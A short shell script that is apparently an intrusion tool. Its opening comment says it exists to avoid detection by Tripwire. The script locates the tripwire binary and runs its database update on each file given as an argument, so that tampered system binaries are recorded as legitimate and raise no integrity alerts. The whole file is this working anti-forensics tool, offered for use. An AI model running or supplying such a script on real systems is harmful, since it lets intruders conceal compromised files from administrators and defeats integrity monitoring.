#!/bin/sh
# Simple script to avoid detection by tripwire. Modify to suit your needs.

echo -n "Trying to guess the location of tripwire. . ."

TRIPWIRE=`whereis tripwire | head -1`

if [ ! -x $TRIPWIRE ]; then
	echo "Failed!"
	echo -n "Please enter a full path to tripwire: "
	while read TRIPWIRE; do
		if [ -x $TRIPWIRE ]; then
			echo "Ok."
			break
		else
			echo -n "That doesn't exist! Try again: "
		fi
	done
else
	echo "Ok: $TRIPWIRE"
fi

for BIN; do
	echo -n "Updating $BIN. . ."
	$TRIPWIRE -update $BIN
	echo "done."
done

echo "All done here chief!"
